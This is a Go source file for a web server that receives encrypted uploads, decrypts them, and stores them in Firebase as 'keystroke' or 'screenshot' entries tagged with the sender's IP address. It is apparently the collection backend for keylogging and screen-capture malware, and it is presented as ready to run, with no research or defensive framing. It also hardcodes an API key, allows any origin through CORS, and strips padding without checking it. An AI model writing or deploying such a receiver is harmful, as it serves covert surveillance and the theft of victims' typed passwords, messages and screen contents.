package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image"
	"image/jpeg"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	_ "image/png"

	"cloud.google.com/go/firestore"
	"cloud.google.com/go/storage"
	"github.com/joho/godotenv"
	"google.golang.org/api/option"
)

var client *firestore.Client
var storageClient *storage.Client
var ctx context.Context

func initFirebase() {
	err := godotenv.Load()
	if err != nil {
		log.Fatalf("❌ Error loading .env file: %v", err)
	}

	creds := map[string]string{
		"type":                        os.Getenv("TYPE"),
		"project_id":                  os.Getenv("PROJECT_ID"),
		"private_key_id":              os.Getenv("PRIVATE_KEY_ID"),
		"private_key":                 os.Getenv("PRIVATE_KEY"),
		"client_email":                os.Getenv("CLIENT_EMAIL"),
		"client_id":                   os.Getenv("CLIENT_ID"),
		"auth_uri":                    os.Getenv("AUTH_URI"),
		"token_uri":                   os.Getenv("TOKEN_URI"),
		"auth_provider_x509_cert_url": os.Getenv("AUTH_PROVIDER_X509_CERT_URL"),
		"client_x509_cert_url":        os.Getenv("CLIENT_X509_CERT_URL"),
	}

	credsJSON, err := json.Marshal(creds)
	if err != nil {
		log.Fatalf("❌ Failed to marshal credentials: %v", err)
	}

	ctx = context.Background()
	client, err = firestore.NewClient(ctx, creds["project_id"], option.WithCredentialsJSON(credsJSON))
	if err != nil {
		log.Fatalf("❌ Firestore init error: %v", err)
	}

	storageClient, err = storage.NewClient(ctx, option.WithCredentialsJSON(credsJSON))
	if err != nil {
		log.Fatalf("❌ Storage init error: %v", err)
	}

	log.Println("✅ Firebase (Firestore + Storage) initialized")
}

func isAuthorized(r *http.Request) bool {
	return r.Header.Get("X-API-KEY") == "arya119000"
}

func withCORS(h http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-API-KEY")
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusOK)
			return
		}
		h.ServeHTTP(w, r)
	}
}

func decryptAES(b64payload, keyB64 string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(b64payload)
	if err != nil {
		return "", fmt.Errorf("base64 decode failed: %w", err)
	}
	key, err := base64.StdEncoding.DecodeString(keyB64)
	if err != nil {
		return "", fmt.Errorf("key decode failed: %w", err)
	}
	if len(data) < aes.BlockSize {
		return "", fmt.Errorf("ciphertext too small")
	}
	iv, cipherText := data[:aes.BlockSize], data[aes.BlockSize:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("aes.NewCipher error: %w", err)
	}
	if len(cipherText)%aes.BlockSize != 0 {
		return "", fmt.Errorf("ciphertext not full blocks")
	}
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(cipherText, cipherText)

	padLen := int(cipherText[len(cipherText)-1])
	plain := cipherText[:len(cipherText)-padLen]

	return string(plain), nil
}

func receiveHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthorized(r) {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Body read failed", http.StatusBadRequest)
		return
	}

	aesKey := os.Getenv("AES_KEY_B64")
	plain, err := decryptAES(string(body), aesKey)
	if err != nil {
		log.Printf("🧨 Decrypt error: %v", err)
		http.Error(w, "Decrypt failed", http.StatusBadRequest)
		return
	}

	ip := r.RemoteAddr
	if fwd := r.Header.Get("X-Forwarded-For"); fwd != "" {
		ip = fwd
	} else {
		host, _, err := net.SplitHostPort(r.RemoteAddr)
		if err == nil {
			ip = host
		}
	}
	if ip == "::1" {
		ip = "127.0.0.1"
	}

	entryType := "keystroke"
	contentToSave := plain

	// Check if it's an image (starts with PNG header)
	if strings.HasPrefix(plain, "\x89PNG") {
		entryType = "screenshot"

		// Decode to image.Image
		imgData := []byte(plain)
		imgReader := bytes.NewReader(imgData)
		img, _, err := image.Decode(imgReader)
		if err != nil {
			log.Printf("❌ Image decode failed: %v", err)
			http.Error(w, "Image decode failed", http.StatusBadRequest)
			return
		}

		// Compress to JPEG
		var compressed bytes.Buffer
		err = jpeg.Encode(&compressed, img, &jpeg.Options{Quality: 50})
		if err != nil {
			log.Printf("❌ JPEG compression failed: %v", err)
			http.Error(w, "Compression failed", http.StatusInternalServerError)
			return
		}

		// Upload to Firebase Storage
		bucketName := os.Getenv("FIREBASE_STORAGE_BUCKET") // e.g., "your-project.appspot.com"
		fileName := fmt.Sprintf("screenshots/%d.jpg", time.Now().UnixNano())
		wc := storageClient.Bucket(bucketName).Object(fileName).NewWriter(ctx)
		wc.ContentType = "image/jpeg"

		if _, err := io.Copy(wc, &compressed); err != nil {
			log.Printf("❌ Upload to Firebase Storage failed: %v", err)
			http.Error(w, "Upload failed", http.StatusInternalServerError)
			return
		}
		if err := wc.Close(); err != nil {
			log.Printf("❌ Finalizing upload failed: %v", err)
			http.Error(w, "Upload finalization failed", http.StatusInternalServerError)
			return
		}

		// Set public URL
		contentToSave = fileName
	}

	// Store in Firestore
	_, _, err = client.Collection("keystrokes").Add(ctx, map[string]interface{}{
		"content":   contentToSave,
		"type":      entryType,
		"timestamp": time.Now(),
		"ip":        ip,
	})
	if err != nil {
		log.Printf("❌ Firestore write error: %v", err)
		http.Error(w, "Firestore write error", http.StatusInternalServerError)
		return
	}

	log.Printf("✅ Stored %s from %s", entryType, ip)
	w.WriteHeader(http.StatusOK)
}

func main() {
	initFirebase()
	http.HandleFunc("/receive", withCORS(receiveHandler))
	fmt.Println("🚀 Server running at http://localhost:8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
